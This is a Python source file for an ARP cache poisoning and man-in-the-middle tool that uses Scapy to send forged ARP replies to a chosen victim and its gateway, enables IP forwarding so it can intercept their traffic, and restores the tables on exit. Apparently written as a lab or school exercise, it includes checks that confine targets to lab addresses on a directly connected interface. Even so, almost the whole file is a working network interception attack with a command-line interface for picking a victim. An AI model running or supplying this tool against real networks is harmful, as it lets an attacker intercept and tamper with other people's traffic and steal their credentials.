#!/usr/bin/env python3
"""
Modern ARP Poisoning & MITM Engine (2026 Edition)
Supports bidirectional ARP cache poisoning, traffic sniffing, IP forwarding, and clean restoration.
"""

import argparse
import os
import ipaddress
import math
import re
import signal
import socket
import subprocess
import struct
import sys
import time
from contextlib import contextmanager
from typing import Optional

try:
    from .lab_scope import parse_lab_ipv4
except ImportError:  # Direct ``python tools/arp_poison.py`` invocation.
    from lab_scope import parse_lab_ipv4

# ANSI terminal colors
C_RESET = "\033[0m"
C_BOLD = "\033[1m"
C_RED = "\033[31m"
C_GREEN = "\033[32m"
C_YELLOW = "\033[33m"
C_BLUE = "\033[34m"
C_CYAN = "\033[36m"

BANNER = f"""{C_RED}{C_BOLD}
   █████╗ ██████╗ ██████╗     ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗
  ██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║
  ███████║██████╔╝██████╔╝    ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║
  ██╔══██║██╔══██╗██╔═══╝     ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║
  ██║  ██║██║  ██║██║         ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
   Automated MITM & ARP Cache Manipulator [2026]
{C_RESET}"""

g_running = True

def signal_handler(sig, frame):
    global g_running
    print(f"\n{C_YELLOW}[!] Caught interrupt signal. Initiating clean restoration...{C_RESET}")
    g_running = False

def read_ip_forwarding() -> Optional[str]:
    """Read the current forwarding value without changing system state."""
    if sys.platform.startswith("linux"):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r", encoding="ascii") as f:
                return f.read().strip()
        except OSError as exc:
            raise RuntimeError(f"cannot read IPv4 forwarding state: {exc}") from exc
    if sys.platform == "darwin":
        try:
            result = subprocess.run(
                ["sysctl", "-n", "net.inet.ip.forwarding"],
                check=True, capture_output=True, text=True,
            )
        except (OSError, subprocess.CalledProcessError) as exc:
            raise RuntimeError(f"cannot read IPv4 forwarding state: {exc}") from exc
        return result.stdout.strip()
    raise RuntimeError(f"IP forwarding control is unsupported on {sys.platform}")


def set_ip_forwarding(value: str) -> None:
    """Set forwarding using argument-safe system interfaces."""
    if value not in ("0", "1"):
        raise ValueError("forwarding value must be 0 or 1")
    val = value
    if sys.platform.startswith("linux"):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="ascii") as f:
                f.write(val)
            print(f"{C_GREEN}[+] Linux IPv4 forwarding set to {val}{C_RESET}")
        except OSError as exc:
            raise RuntimeError(f"could not set IPv4 forwarding: {exc}") from exc
    elif sys.platform == "darwin":
        try:
            subprocess.run(["sysctl", "-w", f"net.inet.ip.forwarding={val}"], check=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
        except (OSError, subprocess.CalledProcessError) as exc:
            raise RuntimeError(f"could not set IPv4 forwarding: {exc}") from exc
        print(f"{C_GREEN}[+] macOS IP forwarding set to {val}{C_RESET}")
    else:
        raise RuntimeError(f"IP forwarding control is unsupported on {sys.platform}")

def mac_to_bytes(mac_str: str) -> bytes:
    if not re.fullmatch(r"[0-9a-fA-F]{2}([:-])[0-9a-fA-F]{2}(?:\1[0-9a-fA-F]{2}){4}", mac_str):
        raise ValueError(f"invalid MAC address: {mac_str}")
    cleaned = mac_str.replace(":", "").replace("-", "")
    return bytes.fromhex(cleaned)

def ip_to_bytes(ip_str: str) -> bytes:
    return socket.inet_pton(socket.AF_INET, str(parse_lab_ipv4(ip_str)))


def validate_direct_lab_route(route_table, target_ip: str, gateway_ip: str,
                              requested_iface: Optional[str] = None) -> str:
    """Require both peers to resolve directly over the same lab interface."""
    target_route = route_table.route(target_ip)
    gateway_route = route_table.route(gateway_ip)
    target_iface, _, target_hop = target_route
    gateway_iface, _, gateway_hop = gateway_route
    if not target_iface or target_iface != gateway_iface:
        raise ValueError("target and gateway must use the same directly connected interface")
    if target_hop not in (None, "0.0.0.0") or gateway_hop not in (None, "0.0.0.0"):
        raise ValueError("target and gateway must be directly connected, not routed through another hop")
    if requested_iface and requested_iface != target_iface:
        raise ValueError(f"selected interface {requested_iface} does not route the lab peers")
    return target_iface


@contextmanager
def preserved_ip_forwarding(reader=read_ip_forwarding, setter=set_ip_forwarding):
    """Restore the saved forwarding state even if enabling it partly fails."""
    previous = reader()
    if previous not in ("0", "1"):
        raise RuntimeError("cannot safely change forwarding without a known prior state")
    try:
        # Enter the try before changing the sysctl: setters can fail after a write.
        setter("1")
        yield previous
    finally:
        if previous in ("0", "1"):
            setter(previous)


def run_forwarding_session(operation, cleanup, reader=read_ip_forwarding,
                           setter=set_ip_forwarding):
    """Run the ARP lifecycle with cleanup inside guaranteed forwarding restoration."""
    with preserved_ip_forwarding(reader, setter):
        try:
            return operation()
        finally:
            cleanup()

def format_mac(raw_bytes: bytes) -> str:
    return ":".join(f"{b:02x}" for b in raw_bytes[:6])

def create_arp_packet(op: int, src_mac: bytes, src_ip: bytes, dst_mac: bytes, dst_ip: bytes) -> bytes:
    """
    Build 42-byte Ethernet + ARP packet:
    - Ethernet: dst_mac (6B), src_mac (6B), type (0x0806)
    - ARP: hw (1), proto (0x0800), hw_len (6), proto_len (4), opcode (op),
           sender_mac (6B), sender_ip (4B), target_mac (6B), target_ip (4B)
    """
    eth_header = dst_mac + src_mac + struct.pack("!H", 0x0806)
    arp_header = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op) + src_mac + src_ip + dst_mac + dst_ip
    return eth_header + arp_header

def get_mac_from_arp_table(ip: str) -> Optional[str]:
    """Inspect local system ARP cache for a given IP"""
    try:
        if sys.platform == "darwin":
            out = subprocess.run(["arp", "-n", ip], check=False,
                                 capture_output=True, text=True).stdout
            for line in out.splitlines():
                if ip in line:
                    parts = line.split()
                    for p in parts:
                        if ":" in p and len(p.split(":")) == 6:
                            return p
        else:
            with open("/proc/net/arp", "r") as f:
                for line in f.readlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 4 and parts[0] == ip:
                        if parts[3] != "00:00:00:00:00:00":
                            return parts[3]
    except Exception:
        pass
    return None

class ArpSpoofer:
    def __init__(self, target_ip: str, gateway_ip: str, target_mac: Optional[str] = None, gateway_mac: Optional[str] = None, iface: Optional[str] = None, interval: float = 1.5):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.gateway_mac = gateway_mac
        self.iface = iface
        self.interval = interval

    def resolve_macs(self):
        # Ping targets to populate system ARP table
        print(f"[*] Resolving MAC addresses for {self.target_ip} and {self.gateway_ip}...")
        for address in (self.target_ip, self.gateway_ip):
            subprocess.run(["ping", "-c", "1", "-W", "1", address], check=False,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if not self.target_mac:
            self.target_mac = get_mac_from_arp_table(self.target_ip)
        if not self.gateway_mac:
            self.gateway_mac = get_mac_from_arp_table(self.gateway_ip)

        if not self.target_mac or not self.gateway_mac:
            print(f"{C_RED}[!] Could not automatically resolve MAC addresses.{C_RESET}")
            if not self.target_mac:
                print(f"    Please provide --target-mac manually for {self.target_ip}")
            if not self.gateway_mac:
                print(f"    Please provide --gateway-mac manually for {self.gateway_ip}")
            sys.exit(1)

        print(f"{C_GREEN}[+] Target:  {self.target_ip} -> {self.target_mac}{C_RESET}")
        print(f"{C_GREEN}[+] Gateway: {self.gateway_ip} -> {self.gateway_mac}{C_RESET}")

    def run(self):
        self.target_ip = str(parse_lab_ipv4(self.target_ip))
        self.gateway_ip = str(parse_lab_ipv4(self.gateway_ip))
        if ipaddress.ip_address(self.target_ip).is_loopback or ipaddress.ip_address(self.gateway_ip).is_loopback:
            raise ValueError("ARP scenarios require private lab addresses on an Ethernet interface")
        if self.target_ip == self.gateway_ip:
            raise ValueError("target and gateway must be different IPv4 addresses")
        if not math.isfinite(self.interval) or not 0.1 <= self.interval <= 60:
            raise ValueError("interval must be between 0.1 and 60 seconds")
        # Check for Scapy if available, otherwise recommend or use C ft_malcolm
        try:
            from scapy.all import Ether, ARP, sendp, conf
            use_scapy = True
        except ImportError:
            use_scapy = False

        if not use_scapy:
            print(f"{C_YELLOW}[!] Scapy is not installed. Install the project dependencies to use this Python ARP mode.")
            print(f"[*] The native C implementation remains available: ./ft_malcolm <src_ip> <src_mac> <tgt_ip> <tgt_mac>{C_RESET}")
            return

        self.target_mac = format_mac(mac_to_bytes(self.target_mac))
        self.gateway_mac = format_mac(mac_to_bytes(self.gateway_mac))

        if self.iface:
            conf.iface = self.iface
        self.iface = validate_direct_lab_route(
            conf.route, self.target_ip, self.gateway_ip, self.iface
        )
        self.resolve_macs()

        print(f"\n{C_CYAN}[*] Starting bidirectional ARP Poisoning...{C_RESET}")
        print(f"    [Victim: {self.target_ip}] <---> [Attacker] <---> [Gateway: {self.gateway_ip}]")
        print(f"    Press Ctrl+C to terminate and restore ARP tables.\n")

        packets_sent = 0

        def poison_operation():
            nonlocal packets_sent
            pkt_to_target = Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
            pkt_to_gateway = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)
            while g_running:
                sendp(pkt_to_target, iface=self.iface, verbose=False)
                packets_sent += 1
                sendp(pkt_to_gateway, iface=self.iface, verbose=False)
                packets_sent += 1
                sys.stdout.write(f"\r{C_BLUE}[*] Poison packets sent: {packets_sent}{C_RESET}")
                sys.stdout.flush()
                time.sleep(self.interval)

        def restore_arp():
            if packets_sent:
                print(f"\n{C_YELLOW}[*] Restoring ARP tables on target and gateway...{C_RESET}")
                restore_target = Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                restore_gateway = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
                sendp(restore_target, count=5, iface=self.iface, verbose=False)
                sendp(restore_gateway, count=5, iface=self.iface, verbose=False)

        run_forwarding_session(poison_operation, restore_arp)
        print(f"\n{C_GREEN}[+] Forwarding state restored; cleanup finished.{C_RESET}")

def main():
    print(BANNER)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    parser = argparse.ArgumentParser(description="Modern ARP Poisoning & MITM Toolkit (2026)")
    parser.add_argument("-t", "--target", required=True, help="Target IP address (Victim)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway / Router IP address")
    parser.add_argument("--target-mac", help="Target MAC address (auto-resolved if omitted)")
    parser.add_argument("--gateway-mac", help="Gateway MAC address (auto-resolved if omitted)")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("--interval", type=float, default=1.5, help="Interval between ARP packets in seconds (default: 1.5)")

    args = parser.parse_args()

    try:
        parse_lab_ipv4(args.target)
        parse_lab_ipv4(args.gateway)
    except ValueError as exc:
        parser.error(str(exc))
    for name, value in (("target", args.target_mac), ("gateway", args.gateway_mac)):
        if value is not None:
            try:
                mac_to_bytes(value)
            except ValueError as exc:
                parser.error(f"{name} MAC: {exc}")
    if not math.isfinite(args.interval) or not 0.1 <= args.interval <= 60:
        parser.error("interval must be between 0.1 and 60 seconds")

    if os.geteuid() != 0:
        print(f"{C_RED}[!] Error: This tool requires root privileges. Please run with sudo.{C_RESET}")
        sys.exit(1)

    spoofer = ArpSpoofer(
        target_ip=args.target,
        gateway_ip=args.gateway,
        target_mac=args.target_mac,
        gateway_mac=args.gateway_mac,
        iface=args.interface,
        interval=args.interval
    )
    try:
        spoofer.run()
    except (OSError, RuntimeError, ValueError) as exc:
        print(f"{C_RED}[!] Error: {exc}{C_RESET}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
